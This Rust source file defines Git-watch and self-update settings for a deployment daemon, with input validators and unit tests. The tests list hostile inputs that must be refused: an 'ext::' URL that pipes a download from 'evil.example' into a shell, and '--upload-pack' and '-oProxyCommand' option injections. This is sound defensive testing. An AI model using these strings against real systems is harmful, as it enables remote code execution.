//! Watching a Git branch so a push redeploys a service.
//!
//! A [`GitWatch`] attached to a [`ServiceSpec`](crate::ServiceSpec) says: keep a
//! working copy of this branch on disk, and when the branch moves, update the
//! copy, run the build step, and restart the service.
//!
//! # Two triggers, and why neither is allowed to be the only one
//!
//! **A webhook is the fast path.** A push reaches this box in the time one HTTP
//! request takes, so a deployment starts within a second of the commit landing
//! rather than up to a whole interval later.
//!
//! **A poll is the floor under it.** A webhook is an event that has to arrive,
//! and it does not arrive when the network hiccups, when the hook was pointed at
//! a URL form the sender does not use, or when nobody configured one at all.
//! Every one of those failures is silent, which is the worst property a
//! deployment trigger can have. A poll cannot fail silently: it either answers
//! with a commit or reports why it could not.
//!
//! So both run, and the webhook is never permitted to become the only path — it
//! makes a poll happen *sooner*, it does not replace one. That is also what
//! makes the webhook safe to expose: the poll it triggers reads the real branch
//! tip with `git ls-remote` before acting, so the request body is never trusted
//! for *what* to deploy. A forged request can only make a legitimate deployment
//! happen earlier; it can never deploy something that is not at the branch tip.
//!
//! Because the webhook carries the latency, the poll interval is a safety net
//! rather than the mechanism, and [`DEFAULT_INTERVAL_SECS`] is set accordingly.
//!
//! # Why the working copy is separate from the service's directory
//!
//! [`GitWatch::path`] is where the checkout lives, and updating it destroys local
//! changes on purpose — a deployment that merges is a deployment that can stop on
//! a conflict at four in the morning. Tracked files are therefore not a place to
//! keep anything the service writes. Untracked ones are left alone, so a build
//! cache, `node_modules`, and an `.env` the operator put there all survive.

use serde::{Deserialize, Serialize};
use std::path::PathBuf;

use crate::validate::Problem;

/// The shortest poll interval that is allowed.
///
/// A remote-ref check is cheap but it is not free, and a one-second poll against
/// a hosting provider is how an account meets a rate limit. Ten seconds is far
/// below any interval a person would choose deliberately, so this only ever
/// catches a mistake or a zero left in by a config that omitted the field.
pub const MIN_INTERVAL_SECS: u64 = 10;

/// How often a branch is checked, when the config does not say.
///
/// Five minutes, not one: with a webhook configured the poll is the *safety
/// net* under it, not the thing that notices a push, so its job is to catch a
/// hook that never arrived rather than to keep latency down. A push with a
/// working webhook deploys in about a second regardless of this number, and a
/// deployment with no webhook still never sits more than this long behind its
/// branch.
pub const DEFAULT_INTERVAL_SECS: u64 = 300;

/// The branch a watch follows when the config does not name one.
pub const DEFAULT_BRANCH: &str = "main";

/// A Git branch whose movement redeploys a service.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct GitWatch {
    /// The repository to clone and pull from.
    ///
    /// Any URL `git` itself accepts. An `ssh://` or `git@host:owner/repo` form
    /// authenticates with the daemon user's own SSH key, which is why no
    /// credential is stored here: a token in this file would be a secret in a
    /// file the daemon rewrites and the console displays.
    pub repository: String,

    /// The branch to follow.
    #[serde(default = "default_branch")]
    pub branch: String,

    /// Where the working copy lives.
    ///
    /// Relative paths resolve against the same directory a service's
    /// [`cwd`](crate::ServiceSpec::cwd) does — the project directory the daemon
    /// was started with — so a checkout and the service built from it are named
    /// the same way and can be the same directory.
    pub path: PathBuf,

    /// Seconds between checks of the remote branch.
    #[serde(default = "default_interval")]
    pub interval_secs: u64,

    /// Whether this watch runs at all.
    ///
    /// Kept rather than deleted so a watch can be switched off during an incident
    /// and switched back on without being typed in again.
    #[serde(default = "default_true")]
    pub enabled: bool,

    /// Whether a moved branch is deployed, or only reported.
    ///
    /// `false` still polls and still records what it found in the service's
    /// output, which is what makes "is this branch ahead of what is deployed?"
    /// answerable without granting the daemon permission to act on it.
    #[serde(default = "default_true")]
    pub auto_update: bool,

    /// A command run in the working copy after a successful update, before the
    /// service starts again.
    ///
    /// Program and arguments, already split, for the reason
    /// [`ServiceSpec::args`](crate::ServiceSpec::args) gives. This is where
    /// `npm ci`, `cargo build --release`, or a migration goes. A non-zero exit
    /// abandons the deployment and leaves the service stopped rather than
    /// starting a half-built tree.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub post_pull: Option<Vec<String>>,

    /// A shared secret that lets a push notify this watch's poll to run now,
    /// instead of waiting out `interval_secs`.
    ///
    /// `None` (the default) leaves this watch poll-only — nothing about
    /// polling changes, and the webhook path refuses any request naming it.
    /// Set only from this daemon's own, never-committed config; a hosting
    /// provider's webhook UI is told the same value so it can sign what it
    /// sends.
    ///
    /// This secret authenticates *who may ask for an earlier poll* — it is
    /// not what makes a deployment safe. The poll it triggers always reads
    /// the real branch tip with `git ls-remote` before doing anything, so
    /// even a forged request can only make a legitimate deployment happen
    /// sooner; it can never deploy content that is not actually at the tip of
    /// the watched branch.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub webhook_secret: Option<String>,
}

/// The build that produces selfhost's own binary, when the config names none.
pub const DEFAULT_SELF_BUILD: &[&str] = &["cargo", "build", "--release", "-p", "selfhost-cli"];

/// The daemon's own repository, watched so a push updates selfhost itself.
///
/// Where a [`GitWatch`] deploys *a service's* branch into its own checkout,
/// this watches the branch selfhost was built from, in the project directory
/// the daemon already runs from — the tree holding `selfhost.config.toml` and
/// `target/`. There is no second checkout: the deployment *is* the working
/// copy, which is why this is its own type rather than a `GitWatch` with a
/// hard-coded path.
///
/// How an update lands is the daemon's business (`selfhost daemon` polls,
/// fetches, builds, and exits for its service manager to restart it); this type
/// only says what to watch and how often.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct SelfUpdate {
    /// The repository this deployment is a clone of.
    ///
    /// The same transports as [`GitWatch::repository`], for the same reason: an
    /// `ext::` URL or a leading dash is code execution as the daemon user.
    pub repository: String,

    /// The branch a push to which updates this deployment.
    #[serde(default = "default_branch")]
    pub branch: String,

    /// Seconds between checks of the remote branch.
    #[serde(default = "default_interval")]
    pub interval_secs: u64,

    /// Whether the watch runs at all — kept, like [`GitWatch::enabled`], so it
    /// can be switched off during an incident without being retyped after.
    #[serde(default = "default_true")]
    pub enabled: bool,

    /// The build run in the project directory after an update, before the
    /// restart. Program and arguments already split, for the reason
    /// [`GitWatch::post_pull`] gives. Absent → [`DEFAULT_SELF_BUILD`].
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub build: Option<Vec<String>>,

    /// A shared secret that lets a push update this deployment *now*, instead
    /// of waiting out `interval_secs`.
    ///
    /// The same mechanism, guarantees and threat model as
    /// [`GitWatch::webhook_secret`] — read that field's documentation, it is the
    /// authority — pointed at this deployment's own repository rather than a
    /// service's. The public path is `/.selfhost/webhook/self`, which is
    /// reserved: it names this section, never a service, so a service called
    /// `self` cannot claim it.
    ///
    /// `None` (the default) leaves self-update poll-only, and the reserved path
    /// answers exactly as an unknown one does.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub webhook_secret: Option<String>,
}

/// The webhook path segment reserved for [`SelfUpdate`].
///
/// Held here, beside the field it authenticates, so the proxy route and the
/// config cannot drift apart about which name is reserved.
pub const SELF_UPDATE_WEBHOOK_NAME: &str = "self";

impl SelfUpdate {
    /// A watch of `branch` in `repository`, with defaults.
    pub fn new(repository: impl Into<String>) -> Self {
        Self {
            repository: repository.into(),
            branch: default_branch(),
            interval_secs: DEFAULT_INTERVAL_SECS,
            enabled: true,
            build: None,
            webhook_secret: None,
        }
    }

    /// The build command to run, with the default filled in.
    pub fn build_command(&self) -> Vec<String> {
        match &self.build {
            Some(command) => command.clone(),
            None => DEFAULT_SELF_BUILD.iter().map(|s| (*s).to_string()).collect(),
        }
    }

    /// This watch as a [`GitWatch`] over the project directory itself, so the
    /// planning helpers that speak `GitWatch` can serve both kinds of watch.
    pub fn as_watch(&self) -> GitWatch {
        let mut watch = GitWatch::new(self.repository.clone(), ".");
        watch.branch = self.branch.clone();
        watch.interval_secs = self.interval_secs;
        watch.enabled = self.enabled;
        watch
    }

    /// Collects every structural problem with this watch, reported against the
    /// dotted path `at` exactly as [`GitWatch::check`] does.
    pub fn check(&self, at: &str, problems: &mut Vec<Problem>) {
        if let Some(message) = repository_problem(&self.repository) {
            problems.push(Problem { field: format!("{at}.repository"), message });
        }
        if let Some(message) = branch_problem(&self.branch) {
            problems.push(Problem { field: format!("{at}.branch"), message });
        }
        if self.interval_secs < MIN_INTERVAL_SECS {
            problems.push(Problem {
                field: format!("{at}.interval_secs"),
                message: format!(
                    "must be at least {MIN_INTERVAL_SECS}; a shorter interval spends the \
                     hosting provider's rate limit without noticing a push any sooner"
                ),
            });
        }
        if self.build.as_ref().is_some_and(|command| command.is_empty()) {
            problems.push(Problem {
                field: format!("{at}.build"),
                message: "is present but empty; omit it entirely to use the default build".into(),
            });
        }
        if self.webhook_secret.as_deref().is_some_and(str::is_empty) {
            problems.push(Problem {
                field: format!("{at}.webhook_secret"),
                message: "is present but empty; omit it entirely to leave self-update poll-only"
                    .into(),
            });
        }
    }
}

fn default_branch() -> String {
    DEFAULT_BRANCH.to_owned()
}

fn default_interval() -> u64 {
    DEFAULT_INTERVAL_SECS
}

fn default_true() -> bool {
    true
}

impl GitWatch {
    /// A watch of `branch` in `repository`, checked out at `path`, with defaults.
    pub fn new(repository: impl Into<String>, path: impl Into<PathBuf>) -> Self {
        Self {
            repository: repository.into(),
            branch: default_branch(),
            path: path.into(),
            interval_secs: DEFAULT_INTERVAL_SECS,
            enabled: true,
            auto_update: true,
            post_pull: None,
            webhook_secret: None,
        }
    }

    /// Whether this watch should be polled at all.
    pub fn is_active(&self) -> bool {
        self.enabled
    }

    /// The fully-qualified ref this watch follows, as `git` names it.
    ///
    /// Spelled out rather than passed as a bare branch name so a tag and a branch
    /// sharing a name cannot resolve to the wrong one — `git ls-remote origin v1`
    /// answers with both, and picking the first is a coin toss.
    pub fn remote_ref(&self) -> String {
        format!("refs/heads/{}", self.branch)
    }

    /// Collects every structural problem with this watch.
    ///
    /// `at` is the dotted path problems are reported against, so the console can
    /// point at the offending field.
    pub fn check(&self, at: &str, problems: &mut Vec<Problem>) {
        if let Some(message) = repository_problem(&self.repository) {
            problems.push(Problem { field: format!("{at}.repository"), message });
        }

        if let Some(message) = branch_problem(&self.branch) {
            problems.push(Problem { field: format!("{at}.branch"), message });
        }

        if self.path.as_os_str().is_empty() {
            problems.push(Problem {
                field: format!("{at}.path"),
                message: "say where the working copy lives".into(),
            });
        } else if self
            .path
            .components()
            .any(|component| matches!(component, std::path::Component::ParentDir))
        {
            // The same rule as everywhere else in this project: a path that would
            // escape its directory is refused, never quietly rewritten. This one
            // is `git clean`ed and hard-reset, so aiming it outside the data
            // directory would destroy whatever else lives there.
            problems.push(Problem {
                field: format!("{at}.path"),
                message: "must not contain \"..\"; the working copy is reset on every \
                          deployment, so it may not point outside the project directory"
                    .into(),
            });
        }

        if self.interval_secs < MIN_INTERVAL_SECS {
            problems.push(Problem {
                field: format!("{at}.interval_secs"),
                message: format!(
                    "must be at least {MIN_INTERVAL_SECS}; a shorter interval spends the \
                     hosting provider's rate limit without noticing a push any sooner"
                ),
            });
        }

        if self.post_pull.as_ref().is_some_and(|command| command.is_empty()) {
            problems.push(Problem {
                field: format!("{at}.post_pull"),
                message: "is present but empty; omit it entirely when there is no build step"
                    .into(),
            });
        }

        if self.webhook_secret.as_deref().is_some_and(str::is_empty) {
            problems.push(Problem {
                field: format!("{at}.webhook_secret"),
                message: "is present but empty; omit it entirely to leave this watch poll-only"
                    .into(),
            });
        }
    }
}

/// Why a repository URL cannot be used, or `None` if it is fine.
///
/// This is a security rule, not a tidiness one. A repository URL reaches the
/// daemon over the control API and is then handed to `git`, and two of `git`'s
/// own features turn a URL into code execution as the daemon user:
///
/// - `ext::<command>` runs that command as the transport. It is the documented
///   behaviour of the transport, not a bug, and it needs no repository to exist.
/// - A URL beginning with `-` is read as an option rather than as a repository,
///   which lets `--upload-pack=<command>` do the same thing.
///
/// So the transports are an allow-list. Anything outside it is refused with the
/// list in the message, rather than being rewritten into something that happens
/// to be safe.
fn repository_problem(repository: &str) -> Option<String> {
    let repository = repository.trim();
    if repository.is_empty() {
        return Some("name the repository to pull from".into());
    }
    if repository.starts_with('-') {
        return Some(format!(
            "\"{repository}\" starts with a dash, which git reads as an option rather than \
             a repository"
        ));
    }
    if repository.chars().any(|c| c.is_ascii_control()) {
        return Some("contains control characters".into());
    }

    let permitted = ["https://", "http://", "ssh://", "git://"];
    if permitted.iter().any(|scheme| repository.starts_with(scheme)) {
        return None;
    }
    // The scp-like form git accepts for SSH: user@host:owner/repo.git. Checked by
    // shape rather than by scheme because it has none.
    if let Some((before, after)) = repository.split_once(':')
        && !before.contains('/')
        && before.contains('@')
        && !after.is_empty()
        && !repository.starts_with("ext::")
    {
        return None;
    }
    Some(format!(
        "\"{repository}\" does not use a transport this daemon will run. Use https://, \
         ssh://, git://, or the user@host:owner/repo form — git's ext:: transport runs \
         a command of its own, which a service definition is not allowed to do"
    ))
}

/// Why a branch name cannot be used, or `None` if it is fine.
///
/// The name is pasted into a ref and passed to `git` as an argument, so the
/// characters `git` itself forbids in a ref are refused here — with the message
/// naming the rule rather than silently substituting a name that would resolve
/// somewhere else.
fn branch_problem(branch: &str) -> Option<String> {
    if branch.trim().is_empty() {
        return Some("name the branch to follow".into());
    }
    if branch.starts_with('-') {
        // A leading dash reaches `git` as an option rather than as a ref.
        return Some(format!("\"{branch}\" starts with a dash, which git reads as an option"));
    }
    if branch.starts_with('/') || branch.ends_with('/') || branch.contains("//") {
        return Some(format!("\"{branch}\" is not a usable ref: check the slashes"));
    }
    if branch.ends_with(".lock") || branch.ends_with('.') {
        return Some(format!("\"{branch}\" is not a usable ref: it may not end in \".\" or \".lock\""));
    }
    if branch.contains("..") || branch.contains("@{") {
        return Some(format!("\"{branch}\" is a revision expression, not a branch name"));
    }
    let forbidden = |c: char| {
        c.is_ascii_control() || matches!(c, ' ' | '~' | '^' | ':' | '?' | '*' | '[' | '\\' | '\x7f')
    };
    if branch.chars().any(forbidden) {
        return Some(format!("\"{branch}\" contains a character git does not allow in a ref"));
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    fn problems_of(watch: &GitWatch) -> Vec<Problem> {
        let mut problems = Vec::new();
        watch.check("service[0].git", &mut problems);
        problems
    }

    #[test]
    fn a_minimal_watch_is_valid() {
        let watch = GitWatch::new("https://github.com/owner/repo.git", "checkouts/site");
        assert!(problems_of(&watch).is_empty());
        assert_eq!(watch.branch, "main");
        assert_eq!(watch.interval_secs, DEFAULT_INTERVAL_SECS);
        assert!(watch.enabled && watch.auto_update);
    }

    #[test]
    fn the_watched_ref_is_fully_qualified_so_a_tag_cannot_win() {
        let mut watch = GitWatch::new("git@github.com:owner/repo.git", "site");
        watch.branch = "release".into();
        assert_eq!(watch.remote_ref(), "refs/heads/release");
    }

    #[test]
    fn a_working_copy_that_would_escape_the_data_directory_is_refused() {
        // It is hard-reset on every deployment, so this is a delete, not a read.
        let mut watch = GitWatch::new("https://example.com/r.git", "../../etc");
        let problems = problems_of(&watch);
        assert!(problems.iter().any(|p| p.field.ends_with(".path")), "{problems:?}");

        watch.path = "checkouts/site".into();
        assert!(problems_of(&watch).is_empty());
    }

    #[test]
    fn a_branch_name_that_git_would_read_as_an_option_is_refused() {
        for bad in ["--upload-pack=evil", "-x"] {
            let mut watch = GitWatch::new("https://example.com/r.git", "site");
            watch.branch = bad.into();
            let problems = problems_of(&watch);
            assert!(problems.iter().any(|p| p.field.ends_with(".branch")), "accepted {bad:?}");
        }
    }

    #[test]
    fn a_branch_name_that_is_not_a_usable_ref_is_refused() {
        for bad in ["", "  ", "feature branch", "a..b", "main@{1}", "a//b", "x.lock", "tip^"] {
            let mut watch = GitWatch::new("https://example.com/r.git", "site");
            watch.branch = bad.into();
            assert!(
                problems_of(&watch).iter().any(|p| p.field.ends_with(".branch")),
                "accepted {bad:?}"
            );
        }
    }

    #[test]
    fn ordinary_branch_names_including_slashes_are_allowed() {
        for good in ["main", "release/2026-07", "feature_x", "v1.2"] {
            let mut watch = GitWatch::new("https://example.com/r.git", "site");
            watch.branch = good.into();
            assert!(problems_of(&watch).is_empty(), "refused {good:?}");
        }
    }

    #[test]
    fn a_poll_faster_than_the_floor_is_refused_with_the_reason() {
        let mut watch = GitWatch::new("https://example.com/r.git", "site");
        watch.interval_secs = 1;
        let problems = problems_of(&watch);
        assert!(problems.iter().any(|p| p.message.contains("rate limit")), "{problems:?}");
    }

    #[test]
    fn a_repository_url_that_would_run_a_command_is_refused() {
        // git's ext:: transport runs its argument as the transport program, and a
        // URL starting with a dash reaches git as an option. Either one turns a
        // service definition posted to the control API into code execution.
        for bad in [
            "ext::sh -c 'curl evil.example/x | sh'",
            "--upload-pack=/tmp/evil",
            "-oProxyCommand=evil",
            "/srv/repos/local.git",
            "file:///srv/repos/local.git",
        ] {
            let watch = GitWatch::new(bad, "site");
            assert!(
                problems_of(&watch).iter().any(|p| p.field.ends_with(".repository")),
                "accepted {bad:?}"
            );
        }
    }

    #[test]
    fn the_ordinary_ways_of_naming_a_remote_repository_are_accepted() {
        for good in [
            "https://github.com/owner/repo.git",
            "http://internal.example/repo.git",
            "ssh://git@github.com/owner/repo.git",
            "git://example.com/repo.git",
            "git@github.com:owner/repo.git",
        ] {
            let watch = GitWatch::new(good, "site");
            assert!(problems_of(&watch).is_empty(), "refused {good:?}");
        }
    }

    #[test]
    fn an_empty_repository_or_path_is_refused() {
        let watch = GitWatch::new("", "");
        let problems = problems_of(&watch);
        assert!(problems.iter().any(|p| p.field.ends_with(".repository")));
        assert!(problems.iter().any(|p| p.field.ends_with(".path")));
    }

    #[test]
    fn an_empty_build_step_is_refused_rather_than_run_as_nothing() {
        let mut watch = GitWatch::new("https://example.com/r.git", "site");
        watch.post_pull = Some(Vec::new());
        assert!(problems_of(&watch).iter().any(|p| p.field.ends_with(".post_pull")));
    }

    #[test]
    fn a_disabled_watch_reports_itself_inactive_without_losing_its_definition() {
        let mut watch = GitWatch::new("https://example.com/r.git", "site");
        watch.enabled = false;
        assert!(!watch.is_active());
        assert_eq!(watch.repository, "https://example.com/r.git");
    }

    #[test]
    fn a_new_watch_has_no_webhook_secret_and_stays_poll_only() {
        let watch = GitWatch::new("https://example.com/r.git", "site");
        assert_eq!(watch.webhook_secret, None);
        assert!(problems_of(&watch).is_empty());
    }

    #[test]
    fn an_empty_webhook_secret_is_refused_rather_than_treated_as_none() {
        let mut watch = GitWatch::new("https://example.com/r.git", "site");
        watch.webhook_secret = Some(String::new());
        assert!(problems_of(&watch).iter().any(|p| p.field.ends_with(".webhook_secret")));
    }

    fn self_update_problems(update: &SelfUpdate) -> Vec<Problem> {
        let mut problems = Vec::new();
        update.check("self_update", &mut problems);
        problems
    }

    #[test]
    fn a_minimal_self_update_is_valid_and_builds_with_the_default_command() {
        let update = SelfUpdate::new("https://github.com/owner/selfhost.git");
        assert!(self_update_problems(&update).is_empty());
        assert_eq!(update.branch, "main");
        assert!(update.enabled);
        assert_eq!(update.build_command().first().map(String::as_str), Some("cargo"));
    }

    #[test]
    fn a_self_update_repository_that_would_run_a_command_is_refused() {
        // The same door as GitWatch, locked the same way: this URL is handed to
        // `git` as the daemon user, in the daemon's own project directory.
        for bad in ["ext::sh -c evil", "--upload-pack=/tmp/evil", "/srv/local.git"] {
            let update = SelfUpdate::new(bad);
            assert!(
                self_update_problems(&update).iter().any(|p| p.field.ends_with(".repository")),
                "accepted {bad:?}"
            );
        }
    }

    #[test]
    fn an_empty_self_update_build_is_refused_rather_than_run_as_nothing() {
        let mut update = SelfUpdate::new("https://example.com/r.git");
        update.build = Some(Vec::new());
        assert!(self_update_problems(&update).iter().any(|p| p.field.ends_with(".build")));
    }

    #[test]
    fn a_self_update_speaks_git_watch_for_the_planning_helpers() {
        let mut update = SelfUpdate::new("git@github.com:owner/selfhost.git");
        update.branch = "release".into();
        let watch = update.as_watch();
        assert_eq!(watch.remote_ref(), "refs/heads/release");
        assert_eq!(watch.repository, "git@github.com:owner/selfhost.git");
    }
}
